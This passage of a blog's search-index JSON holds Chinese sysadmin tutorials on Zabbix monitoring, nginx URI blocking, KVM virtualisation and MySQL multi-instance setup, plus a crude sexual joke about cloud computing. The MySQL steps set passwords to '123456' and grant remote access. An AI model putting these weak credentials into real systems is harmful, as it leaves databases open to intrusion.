&gt;&gt;&#x2F;etc&#x2F;sudoers注：取值脚本中的ipvsadm命令也需要sudo权限，否则会报错 zabbix添加DNS LVS监控模板: dns-lvs ，后添加监控项，触发器、图形等12345监控项Key值：dns.lvs[AllInConn]dns.lvs[113_InActConn]dns.lvs[112_InActConn]dns.lvs[111_InActConn] 主机内调用模板：dns-lvs","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"LVS","slug":"LVS","permalink":"https://garywu520.github.io/tags/LVS/"},{"name":"LVS连接数监控","slug":"LVS连接数监控","permalink":"https://garywu520.github.io/tags/LVS%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%91%E6%8E%A7/"},{"name":"ipvsadm","slug":"ipvsadm","permalink":"https://garywu520.github.io/tags/ipvsadm/"},{"name":"ActiveConn","slug":"ActiveConn","permalink":"https://garywu520.github.io/tags/ActiveConn/"},{"name":"InActConn","slug":"InActConn","permalink":"https://garywu520.github.io/tags/InActConn/"}]},{"title":"zabbix监控web页面url状态","slug":"zabbix监控web页面url状态","date":"2017-12-27T02:19:21.000Z","updated":"2018-01-25T06:21:16.086Z","comments":true,"path":"2017/12/27/zabbix监控web页面url状态/","link":"","permalink":"https://garywu520.github.io/2017/12/27/zabbix%E7%9B%91%E6%8E%A7web%E9%A1%B5%E9%9D%A2url%E7%8A%B6%E6%80%81/","excerpt":"1通过zabbi做web监控不仅仅可以监控到站点的响应时间，还可以根据站点返回的状态码，或者响应时间做报警","text":"1通过zabbi做web监控不仅仅可以监控到站点的响应时间，还可以根据站点返回的状态码，或者响应时间做报警 进入主机-添加Web场景 12345678910111213在configuration—hosts 中打开主机列表，选择需要添加监控主机的web ,选择web项，再单击右上角的Create web scenario名称(Name): 以监控的域名作为名称New application: 可以新指定一个应用集Agent: IE10在Steps选项卡添加以下步骤：名称(Name): 以监控的域名作为名称URL： 填写要监控的URL地址(一般包括URI)要求的状态码：200 (即非200就告警)添加最后再点击添加来完成web场景配置 配置web监控触发器 123456789101112131415161718在configuration—hosts 中打开主机列表，选择需要添加监控主机 -- 触发器 -- 添加触发器名称： url请求错误表达式： 添加: 键值选择：“web.test.rspcode[......]” 功能: 最末(最近)T值不是N N： 200 表达式最终如下： &#123;ip:web.test.rspcode[name,name].last()&#125;&lt;&gt;200 and &#123;ip:web.test.rspcode[name,name].last()&#125;&lt;&gt;200 and &#123;ip:web.test.rspcode[name,name].last()&#125;&lt;&gt;200 and &#123;ip:web.test.rspcode[name,name].last()&#125;&lt;&gt;200 URL： 填写要监控的URL严重性： 一般严重添加表达式含义：连续4次请求检测，如果最新的值不是200,就会触发告警","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"web监控","slug":"web监控","permalink":"https://garywu520.github.io/tags/web%E7%9B%91%E6%8E%A7/"},{"name":"URL监控","slug":"URL监控","permalink":"https://garywu520.github.io/tags/URL%E7%9B%91%E6%8E%A7/"}]},{"title":"nginx匹配屏蔽uri接口","slug":"nginx匹配屏蔽uri接口","date":"2017-12-25T11:06:20.000Z","updated":"2017-12-26T04:07:42.029Z","comments":true,"path":"2017/12/25/nginx匹配屏蔽uri接口/","link":"","permalink":"https://garywu520.github.io/2017/12/25/nginx%E5%8C%B9%E9%85%8D%E5%B1%8F%E8%94%BDuri%E6%8E%A5%E5%8F%A3/","excerpt":"12需求：屏蔽uri接口请求确认哪个业务哪个log量更大就配置哪个，或者判断同一个业务的具体端口占用的日志大小，找到log量最大的业务","text":"12需求：屏蔽uri接口请求确认哪个业务哪个log量更大就配置哪个，或者判断同一个业务的具体端口占用的日志大小，找到log量最大的业务 配置对应业务nginx配置文件 12345678910在location字段外添加如下代码if ( $query_string ~* (.*)do&#x3D;Tasks&amp;token&#x3D;$ )&#123; return 206;&#125;注：修改的是前端机配置文件(匹配拦截不转发到后端)“do&#x3D;Tasks&amp;token&#x3D;$”为筛选匹配内容，可根据实际情况修改返回值定义为206是因为nginx拦截匹配的接口请求后，不让其返回错误","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"uri","slug":"uri","permalink":"https://garywu520.github.io/tags/uri/"},{"name":"屏蔽接口","slug":"屏蔽接口","permalink":"https://garywu520.github.io/tags/%E5%B1%8F%E8%94%BD%E6%8E%A5%E5%8F%A3/"}]},{"title":"tail统计日志字段百分比","slug":"tail统计日志字段百分比","date":"2017-12-25T10:03:52.000Z","updated":"2017-12-25T10:14:13.877Z","comments":true,"path":"2017/12/25/tail统计日志字段百分比/","link":"","permalink":"https://garywu520.github.io/2017/12/25/tail%E7%BB%9F%E8%AE%A1%E6%97%A5%E5%BF%97%E5%AD%97%E6%AE%B5%E7%99%BE%E5%88%86%E6%AF%94/","excerpt":"场景需求 123场景： 某台nginx后端机出现CPU占用高的情况，快速判断是哪个业务后，对其访问日志进行分析。分析日志后发现，某个请求字段在log中出现的频率很高，接下来就要对该字段进行粗略统计来查找问题。","text":"场景需求 123场景： 某台nginx后端机出现CPU占用高的情况，快速判断是哪个业务后，对其访问日志进行分析。分析日志后发现，某个请求字段在log中出现的频率很高，接下来就要对该字段进行粗略统计来查找问题。 方法 123456tail -10000 nginx.access.log | grep &quot;GET ...... HTTP&#x2F;1.0&quot; |wc -l思路：输出最后10000行日志，并对特定字段进行筛选，最后使用wc -l来统计数量。统计后的数量除以10000即可算出占比，如果占比较大，就要及时告知研发进行进一步处理。注：需要使用tail命令，禁止使用tailf或tail -f，道理你懂得","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"log","slug":"log","permalink":"https://garywu520.github.io/tags/log/"},{"name":"tail","slug":"tail","permalink":"https://garywu520.github.io/tags/tail/"},{"name":"tailf","slug":"tailf","permalink":"https://garywu520.github.io/tags/tailf/"},{"name":"日志统计","slug":"日志统计","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E7%BB%9F%E8%AE%A1/"}]},{"title":"不一样的云计算解释","slug":"不一样的云计算解释","date":"2017-12-24T04:47:12.000Z","updated":"2017-12-24T05:06:26.908Z","comments":true,"path":"2017/12/24/不一样的云计算解释/","link":"","permalink":"https://garywu520.github.io/2017/12/24/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E4%BA%91%E8%AE%A1%E7%AE%97%E8%A7%A3%E9%87%8A/","excerpt":"不一样的云计算解释：","text":"不一样的云计算解释： 1234567891011121314151617你娶了一个老婆，这叫传统IT架构。你觉得一个老婆不够，这叫传统企业CIO的困境。你又娶了一个老婆，这叫双活数据中心。你在外地又娶了一个小老婆，这叫两地三中心容灾。你娶了很多风格气质各异的小老婆，以至于形成了后宫，这叫私有云。 你的后宫就叫计算资源池。 你从后宫里选出懂事有能的管理其他小老婆，这叫私有云管理方案。 管事的那个就是Hyperv或VMware。你不娶小老婆，改成包养很多情人，这叫托管云。 你是穷人，没有钱包养任何人也没钱娶小老婆，你选择去洗浴中心解决问题，这叫面向中小企业的公有云服务。 你在享受公有云服务的同时还得交公粮，这叫中小企业的混合IT架构。 123456789101112131415161718192021222324252627你是富人，但也喜欢去高级夜总会，这叫面向大企业用户的公有云服务。你有钱，同时包养小老婆和情人，还去洗浴中心，这叫混合云。 但是在混合云里，最关键的业务还是会谨慎地采用传统IT架构。你有钱，包养小老婆，但有一天所有小老婆都来大姨妈，你还得去洗浴中心，这叫Cloud Burst。 洗浴中心就是云服务提供商。 本地最大的洗浴中心是AWS。 高端那个比如是18M。 打出商务的名头的是SalesForce。 在**上发帖“我们的技师服务态度超过对面家9倍”的是O记。不开洗浴中心，但是专门卖水床卖情趣床的是等灯等灯。 不开洗浴中心，但是做陌陌类应用开发运营的是C记。 本地的洗浴中心都是两个有背景的大老板开的，他们是OpenStack和CloudStack。场子小且只用本地或附近技师的是本土中小云服务商。 如果上头没人罩，本土中小云服务商很难开得长。 开洗浴中心的老板有政府背景，这是城市云。 开洗浴中心的老板有黑社会背景，这是电信云。 洗浴中心要VIP卡才让进，这是行业云。 洗浴中心只面向本小区业主服务，这是园区云。你的小老婆们和情人们可能因为矛盾而让你的经济问题败露，这叫私有云安全问题。 你去洗浴中心可能染上病，这是公有云安全问题。 由此可见公有云和私有云的安全问题是两种不同性质的问题。 只提供场所，需要你自己去找技师的洗浴中叫IAAS。 提供场所和技师的洗浴中心叫PAAS。做到东莞ISO的程度就叫SAAS。下载AV录像自己打飞机叫VAAS。一个有很多人分享心得的洗浴中心信息网站，这是开放数据中心联盟。 洗浴中心的行业协会叫Cloud Builder。 下榻一家五星级宾馆，你习惯性地用你用微信陌陌定个位，这叫Cloud Finder。 良家妇女下海，这叫传统IT应用的云化。你去洗浴中心的经验很多，看见门脸就知道洗浴中心提不提供服务，看见新技师就能推测出服务质量，这叫数据分析和挖掘。 你把这些信息和心得有偿分享给其他人，你是大数据服务商。 一个地方不严打洗浴中心，这是智慧城市。 来源：Internet","categories":[],"tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"云计算","slug":"云计算","permalink":"https://garywu520.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"}]},{"title":"云计算OpenStack与KVM虚拟化","slug":"云计算OpenStack与KVM虚拟化","date":"2017-12-24T01:38:54.000Z","updated":"2018-01-15T09:23:36.738Z","comments":true,"path":"2017/12/24/云计算OpenStack与KVM虚拟化/","link":"","permalink":"https://garywu520.github.io/2017/12/24/%E4%BA%91%E8%AE%A1%E7%AE%97OpenStack%E4%B8%8EKVM%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"什么是云计算？ 1云计算是使用和交付的一种模式，云计算使用了虚拟化技术,如KVM&#x2F;XEN&#x2F;OpenVZ等. 云计算分类 1私有云、公有云、混合云、托管云、专用云、行业云、政务云等等 参考：不一样的云计算解释","text":"什么是云计算？ 1云计算是使用和交付的一种模式，云计算使用了虚拟化技术,如KVM&#x2F;XEN&#x2F;OpenVZ等. 云计算分类 1私有云、公有云、混合云、托管云、专用云、行业云、政务云等等 参考：不一样的云计算解释 什么是KVM 1kVM是内核级虚拟化技术，分为硬件虚拟化（即硬件支持的虚拟化）和软件虚拟化（即软件虚拟的虚拟化） KVM、Qemu和qemu-kvm的区别 1234567KVM是内核空间虚拟化的工具,Qemu是一个用户空间虚拟化的工具Qemu是一个模拟器，它向Guest OS模拟CPU和其他硬件，Guest OS认为自己和硬件直接打交道，其实是同Qemu模拟出来的硬件打交道，Qemu将这些指令转译给真正的硬件。KVM是linux内核的模块，它需要CPU的支持，采用硬件辅助虚拟化技术Intel-VT，AMD-V，内存的相关如Intel的EPT和AMD的RVI技术，Guest OS的CPU指令不用再经过Qemu转译，直接运行，大大提高了速度Qemu将KVM整合进来，通过ioctl调用&#x2F;dev&#x2F;kvm接口，将有关CPU指令的部分交由内核模块来做。kvm负责cpu虚拟化+内存虚拟化，实现了cpu和内存的虚拟化，但kvm不能模拟其他设备。qemu模拟IO设备（网卡，磁盘等），kvm加上qemu之后就能实现真正意义上服务器虚拟化。因为用到了上面两个东西，所以称之为qemu-kvm。 1而OpenStack几乎支持所有的虚拟化管理程序，不论是开源的（Xen与KVM）还是厂商的（Hyper-V与VMware）。但在以前，OpenStack是基于KVM开发的，KVM常常成为默认的虚拟机管理程序。两者都使用相同的开放源理念与开发方法。 服务器开启虚拟化 1Dell服务器 -- 按F2进入 system setup -- processor settimgs -- 开启Virtual Technology KVM虚拟化配置1234检查CPU是否支持KVM虚拟化：egrep &#39;(vmx|svm)&#39; &#x2F;proc&#x2F;cpuinfo注：KVM已经集成到了系统内核当中，如果上面的命令结果出现“vmx或svm”说明CPU支持,否则不支持 kvm管理工具 1libvirt 或 oVirt 安装部署Qemu-kvm 1234更换个清华源yum install -y qemu-kvm libvirt virt-install注：libvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。 123456789101112把镜像放到&#x2F;opt目录下ls -lh &#x2F;opt&#x2F;CentOS-6.9_x86_64.raw #启动libvirtsystemctl status libvirtd- libvirt启动后会桥接网卡ifconfig - libvirt启动后还会启动一个轻量级dnsps -ef |grep dnsmasq 安装CentOS-KVM虚拟机 123456789创建虚拟机硬盘文件qemu-img create -f raw &#x2F;opt&#x2F;CentOS-6.9_x86_64.raw 3Gvirt-install --virt-type kvm --name CentOS-6.6-x86_64 --ram 1024 --cdrom&#x3D;&#x2F;opt&#x2F;CentOS-6.9-x86_64-minimal.iso --disk path&#x3D;&#x2F;opt&#x2F;CentOS-6.9_x86_64.raw --network network&#x3D;default --graphics vnc,listen&#x3D;0.0.0.0 --noautoconsole此时，立即使用TightVNC Viewer连接kvm宿主机IP地址,连接后就可以看到操作系统安装界面了，一步步安装，然后reboot注：只有配置了KVM虚拟机，libvirt就会生成一个与操作系统对应的xml文件，其记录了kvm虚拟机的状态。路径如下：&#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;CentOS-6.6-x86_64.xml 注：此文件只能通过“virsh edit”命令修改 启动kvm虚拟机 12345678910列出所有虚拟机[root@linux-node1 opt]# virsh list --all Id Name State---------------------------------------------------- - CentOS-6.6-x86_64 shut off启动虚拟机virsh start CentOS-6.6-x86_64再使用TightVNC Viewer连接，进行优化配置 删除kvm虚拟机 12345务必按顺序执行virsh shutdown CentOS-6.6-x86_64 virsh destroy CentOS-6.6-x86_64rm -f &#x2F;opt&#x2F;CentOS-6.9_x86_64.raw #删除磁盘镜像文件virsh undefine CentOS-6.9_x86_64 优化配置 123456789101112配置网卡：DEVICE&#x3D;eth0TYPE&#x3D;EthernetONBOOT&#x3D;yesBOOTPROTO&#x3D;dhcpservice network restart然后安装你所需的程序即可注：之所以kvm虚拟机能访问外网，是因为宿主机本身iptables做了映射[root@linux-node1 opt]# iptables -t nat -vnL 创建/修改kvm虚拟机桥接网卡 12345678910111213141516171819202122关闭kvm虚拟机shutdown -h now查看默认桥接网卡[root@linux-node1 opt]# brctl showbridge name bridge id STP enabled interfacesvirbr0 8000.5254009241ef yes virbr0-nic#创建桥接网卡br0[root@linux-node1 opt]# brctl addbr br0[root@linux-node1 opt]# brctl showbridge name bridge id STP enabled interfacesbr0 8000.000000000000 no virbr0 8000.5254009241ef yes virbr0-nic修改桥接网卡brctl addif br0 eth0(注：配置后，xshell连接会中断,可以通过下面的方法配置)(注：以下需要在KVM宿主机配置）ip addr dev eth0 192.168.56.15&#x2F;24 #删除eth0网卡IP地址ifconfig br0 192.168.56.15&#x2F;24 up #添加br0网卡IP地址 route add default gw 192.168.56.2 #添加默认网关此时，就可以通过xshell连接了 配置kvm虚拟机使用br0桥接模式 1234567891011121314151617注：只有配置了KVM虚拟机，libvirt就会生成一个与操作系统对应的xml文件，其记录了kvm虚拟机的状态。路径如下：&#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;CentOS-6.6-x86_64.xml 注：此文件只能通过“virsh edit”命令修改virsh edit CentOS-6.6-x86_64 #编辑虚拟机的网络配置为桥接模式&lt;interface type&#x3D;&#39;bridge&#39;&gt; #改为bridge&lt;mac address&#x3D;&#39;52:54:00:65:f4:57&#39;&#x2F;&gt;&lt;source bridge&#x3D;&#39;br0&#39;&#x2F;&gt; #改为source bridge和br0查看所有kvm虚拟机[root@linux-node1 ~]# virsh list --all启动kvm虚拟机[root@linux-node1 ~]# virsh start CentOS-6.6-x86_64Domain CentOS-6.6-x86_64 started使用TightVNC客户端连接虚拟机IPTightVNC添加kvm宿主机的IP地址(此处是192.168.56.15) 热添加CPU/内存 1234567891011121314151617181920212223242526272829303132注：只有配置了KVM虚拟机，libvirt就会生成一个与操作系统对应的xml文件，其记录了kvm虚拟机的状态。路径如下：&#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;CentOS-6.6-x86_64.xml 注：此文件只能通过“virsh edit”命令修改(1)修改配置文件virsh edit CentOS-6.6-x86_64 cpu改为支持热添加auto, 定义当前分配1个cpu,定义最大支持4个cpu&lt;vcpu placement&#x3D;&#39;auto&#39; current&#x3D;&quot;1&quot;&gt;4&lt;&#x2F;vcpu&gt;定义最大内存和当前内存&lt;memory unit&#x3D;&#39;KiB&#39;&gt;1048576&lt;&#x2F;memory&gt;&lt;currentMemory unit&#x3D;&#39;KiB&#39;&gt;1048576&lt;&#x2F;currentMemory&gt;(2)停止并启动kvm虚拟机（重启目的是让刚才定义的热添加配置生效，而非动态扩容需要重启）virsh shutdown CentOS-6.6-x86_64virsh start CentOS-6.6-x86_64(3)动态设置cpu增加cpu数量到2个virsh setvcpus CentOS-6.6-x86_64 2 --live(4)动态收缩内存大小查看当前内存virsh qemu-monitor-command CentOS-6.6-x86_64 --hmp --cmd info balloonballoon: actual&#x3D;1024收缩内存大小virsh qemu-monitor-command CentOS-6.6-x86_64 --hmp --cmd balloon 512增大内存大小virsh qemu-monitor-command CentOS-6.6-x86_64 --hmp --cmd balloon 2048 virsh使用 1virsh --help 12345678910111213141516171819202122virt-clone -o centos7_mini -n centos7_mini15 --auto-clone #克隆mini，新克隆的为mini15-o #原始机名字，必须为关闭或暂停状态-n #新客户机的名称--auto-clone #从原始客户机配置中自动生成克隆名称和存储路径--replace #不检查命名冲突，覆盖任何使用相同名称的客户机-f #可以指定克隆后的主机镜像放在指定目录下virsh autostart xxx #让子机随宿主机开机自动启动virsh autostart --disable xxx #解除自动启动virt-install #建立kvm虚拟机virsh list #查看正在运行的KVM虚拟机virsh list --all #查看所有KVM虚拟机virsh start name #启动KVM虚拟机virsh shutdown name #正常关闭KVM虚拟机virsh destroy name #强制关闭KVM虚拟机(类似于直接断电)virsh suspend name #挂起KVM虚拟机virsh resume name #恢复挂起的KVM虚拟机virsh dumpxml name #查看KVM虚拟机配置文件，可以把输出的内容定义到xml里，用来克隆迁移用。virsh edit name #编辑KVM虚拟机的xml配置文件virsh define &#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;name.xml #定义注册虚拟机，需要先查看xml文件对应的镜像，img等路径是否存在或修改指定路径virsh undefine name #彻底删除KVM虚拟机,不可逆,如果想找回来,需要备份&#x2F;etc&#x2F;libvirt&#x2F;qemu的xml文件","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"云计算","slug":"云计算","permalink":"https://garywu520.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"virsh","slug":"virsh","permalink":"https://garywu520.github.io/tags/virsh/"},{"name":"oVirt","slug":"oVirt","permalink":"https://garywu520.github.io/tags/oVirt/"},{"name":"KVM虚拟化","slug":"KVM虚拟化","permalink":"https://garywu520.github.io/tags/KVM%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"MySQL多实例部署2","slug":"MySQL多实例部署2","date":"2017-12-23T10:00:05.000Z","updated":"2018-07-02T02:55:40.791Z","comments":true,"path":"2017/12/23/MySQL多实例部署2/","link":"","permalink":"https://garywu520.github.io/2017/12/23/MySQL%E5%A4%9A%E5%AE%9E%E4%BE%8B%E9%83%A8%E7%BD%B22/","excerpt":"注：做多实例，端口若与现有冲突，则需要先关闭mysql再继续 mysql部署 参考： MySQL部署","text":"注：做多实例，端口若与现有冲突，则需要先关闭mysql再继续 mysql部署 参考： MySQL部署 实例:3307 my.cnf文件 12345678910111213141516[client]port &#x3D; 3307socket &#x3D; &#x2F;data&#x2F;3307&#x2F;mysql.sock[mysqld]user &#x3D; mysqlport &#x3D; 3307socket &#x3D; &#x2F;data&#x2F;3307&#x2F;mysql.sockbasedir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysqldatadir &#x3D; &#x2F;data&#x2F;3307&#x2F;datalog-bin &#x3D; &#x2F;data&#x2F;3307&#x2F;mysql-binserver-id &#x3D; 3307 #server-id不冲突即可，这里和端口号对应[mysqld_safe]log-error&#x3D;&#x2F;data&#x2F;3307&#x2F;mysql_3307.errpid-file&#x3D;&#x2F;data&#x2F;3307&#x2F;mysqld.pid mysqld启动脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!&#x2F;bin&#x2F;sh#################################################3307 MySQL startport&#x3D;3307mysql_user&#x3D;&quot;root&quot;CmdPath&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&quot;mysql_sock&#x3D;&quot;&#x2F;data&#x2F;$&#123;port&#125;&#x2F;mysql.sock&quot;mysqld_pid_file_path&#x3D;&#x2F;data&#x2F;3307&#x2F;3307.pidstart()&#123; if [ ! -e &quot;$mysql_sock&quot; ];then printf &quot;Starting MySQL...\\n&quot; &#x2F;bin&#x2F;sh $&#123;CmdPath&#125;&#x2F;mysqld_safe --defaults-file&#x3D;&#x2F;data&#x2F;$&#123;port&#125;&#x2F;my.cnf --pid-file&#x3D;$mysqld_pid_file_path 2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null &amp; sleep 3 else printf &quot;MySQL is running...\\n&quot; exit 1 fi&#125;stop()&#123; if [ ! -e &quot;$mysql_sock&quot; ];then printf &quot;MySQL is stopped...\\n&quot; exit 1 else printf &quot;Stoping MySQL...\\n&quot; mysqld_pid&#x3D;&#96;cat &quot;$mysqld_pid_file_path&quot;&#96; if (kill -0 $mysqld_pid 2&gt;&#x2F;dev&#x2F;null) then kill $mysqld_pid sleep 2 fi fi&#125;restart()&#123; printf &quot;Restarting MySQL...\\n&quot; stop sleep 2 start&#125;case &quot;$1&quot; in start) start ;; stop) stop ;; restart) restart ;; *) printf &quot;Usage: &#x2F;data&#x2F;$&#123;port&#125;&#x2F;mysql &#123;start|stop|restart&#125;\\n&quot;esac 实例：3308 my.cnf文件 12345678910111213141516[client]port &#x3D; 3308socket &#x3D; &#x2F;data&#x2F;3308&#x2F;mysql.sock[mysqld]user &#x3D; mysqlport &#x3D; 3308socket &#x3D; &#x2F;data&#x2F;3308&#x2F;mysql.sockbasedir &#x3D; &#x2F;usr&#x2F;local&#x2F;mysqldatadir &#x3D; &#x2F;data&#x2F;3308&#x2F;datalog-bin &#x3D; &#x2F;data&#x2F;3308&#x2F;mysql-binserver-id &#x3D; 3308 #server-id不冲突即可，这里和端口号对应[mysqld_safe]log-error&#x3D;&#x2F;data&#x2F;3308&#x2F;mysql_3308.errpid-file&#x3D;&#x2F;data&#x2F;3308&#x2F;mysqld.pid mysqld启动脚本 1参考3307启动脚本 配置12345678910111213141516171819202122232425262728293031323334创建数据目录授权mkdir &#x2F;data&#x2F;&#123;3307,3308&#125;&#x2F;data -p把3306的&#x2F;etc&#x2F;my.cnf和脚本文件放到&#x2F;data&#x2F;3307下把3307的&#x2F;etc&#x2F;my.cnf和脚本文件放到&#x2F;data&#x2F;3308下chown -R mysql.mysql &#x2F;data&#x2F;分别初始化2个新的MySQL实例cd &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;scripts .&#x2F;mysql_install_db --defaults-file&#x3D;&#x2F;data&#x2F;3307&#x2F;my.cnf --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;data&#x2F;3307&#x2F;data --user&#x3D;mysql.&#x2F;mysql_install_db --defaults-file&#x3D;&#x2F;data&#x2F;3308&#x2F;my.cnf --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;data&#x2F;3308&#x2F;data --user&#x3D;mysql授权执行权限并启动数据库#5.6.36特殊性：需要创建错误日志文件touch &#x2F;data&#x2F;3307&#x2F;mysql_3307.errtouch &#x2F;data&#x2F;3308&#x2F;mysql_3308.errchown -R mysql.mysql &#x2F;data&#x2F;给启动脚本添加执行权限chmod +x &#x2F;data&#x2F;3307&#x2F;mysqlchmod +x &#x2F;data&#x2F;3308&#x2F;mysql分别启动&#x2F;data&#x2F;3307&#x2F;mysql start&#x2F;data&#x2F;3308&#x2F;mysql start[root@db02 scripts]# netstat -lntup|grep 330[root@host23 3308]# &#x2F;data&#x2F;3308&#x2F;mysql startStarting MySQL...[root@host23 3308]# ss -lntup |grep 330tcp LISTEN 0 80 :::3306 :::* users:((&quot;mysqld&quot;,pid&#x3D;25137,fd&#x3D;10))tcp LISTEN 0 80 :::3307 :::* users:((&quot;mysqld&quot;,pid&#x3D;31355,fd&#x3D;11))tcp LISTEN 0 80 :::3308 :::* users:((&quot;mysqld&quot;,pid&#x3D;31816,fd&#x3D;11)) 多实例socket方式登录123多实例socket方式登陆mysql -S &#x2F;data&#x2F;3307&#x2F;mysql.sockmysql -S &#x2F;data&#x2F;3308&#x2F;mysql.sock 测试多实例远程登陆1234567891011121314151617多实例初始化密码： mysqladmin -u root -p password &#39;123456&#39; -S &#x2F;data&#x2F;3308&#x2F;mysql.sock 给用户授权数据库权限mysql&gt; create database app;mysql&gt; grant all on app.* to admin@&#39;10.0.10.%&#39; identified by &#39;123456&#39;;mysql&gt; flush privileges;在同网段其他机器测试多实例远程登陆[root@host24 ~]# mysql -uadmin -p123456 -h 10.0.10.23 -P 3308MySQL [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || app |+--------------------+ -&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt; 再新增配置一个3309的实例 12345678910111213141516171819202122232425262728293031323334353637#创建数据目录mkdir -p &#x2F;data&#x2F;3309&#x2F;data#拷贝配置文件\\cp &#x2F;data&#x2F;3307&#x2F;my.cnf &#x2F;data&#x2F;3309&#x2F;\\cp &#x2F;data&#x2F;3307&#x2F;mysql &#x2F;data&#x2F;3309&#x2F;#替换配置sed -i &#39;s&#x2F;3307&#x2F;3309&#x2F;g&#39; &#x2F;data&#x2F;3309&#x2F;my.cnf sed -i &#39;s&#x2F;server-id &#x3D; 3307&#x2F;server-id &#x3D; 3309&#x2F;g&#39; &#x2F;data&#x2F;3309&#x2F;my.cnf sed -i &#39;s&#x2F;3307&#x2F;3309&#x2F;g&#39; &#x2F;data&#x2F;3309&#x2F;mysql#修改权限chown -R mysql:mysql &#x2F;data&#x2F;3309chmod 700 &#x2F;data&#x2F;3309&#x2F;mysql#初始化cd &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;scripts.&#x2F;mysql_install_db --defaults-file&#x3D;&#x2F;data&#x2F;3309&#x2F;my.cnf --datadir&#x3D;&#x2F;data&#x2F;3309&#x2F;data --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --user&#x3D;mysql#创建错误日志文件touch &#x2F;data&#x2F;3309&#x2F;mysql_3309.err#修改目录权限chown -R mysql:mysql &#x2F;data&#x2F;3309egrep &quot;server-id|log-bin&quot; &#x2F;data&#x2F;3309&#x2F;my.cnf #启动mysql3309实例并验证端口&#x2F;data&#x2F;3309&#x2F;mysql start ss -lntup |grep 330tcp LISTEN 0 80 :::3306 :::* users:((&quot;mysqld&quot;,pid&#x3D;25137,fd&#x3D;10))tcp LISTEN 0 80 :::3307 :::* users:((&quot;mysqld&quot;,pid&#x3D;31355,fd&#x3D;11))tcp LISTEN 0 80 :::3308 :::* users:((&quot;mysqld&quot;,pid&#x3D;31816,fd&#x3D;11))tcp LISTEN 0 80 :::3309 :::* users:((&quot;mysqld&quot;,pid&#x3D;32103,fd&#x3D;11))#客户端连接mysql 3309实例mysql -S &#x2F;data&#x2F;3309&#x2F;mysql.sock -&gt;-&gt;-&gt;-&gt;-&gt;-&gt; The End -&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://garywu520.github.io/tags/MariaDB/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"dba","slug":"dba","permalink":"https://garywu520.github.io/tags/dba/"},{"name":"PerconaDB","slug":"PerconaDB","permalink":"https://garywu520.github.io/tags/PerconaDB/"},{"name":"Oracle","slug":"Oracle","permalink":"https://garywu520.github.io/tags/Oracle/"},{"name":"MySQL多实例","slug":"MySQL多实例","permalink":"https://garywu520.github.io/tags/MySQL%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"MySQL多实例远程登陆","slug":"MySQL多实例远程登陆","permalink":"https://garywu520.github.io/tags/MySQL%E5%A4%9A%E5%AE%9E%E4%BE%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/"}]},{"title":"Mysql单节点部署1","slug":"Mysql单节点部署1","date":"2017-12-23T01:50:45.000Z","updated":"2018-01-08T09:23:17.780Z","comments":true,"path":"2017/12/23/Mysql单节点部署1/","link":"","permalink":"https://garywu520.github.io/2017/12/23/Mysql%E5%8D%95%E8%8A%82%E7%82%B9%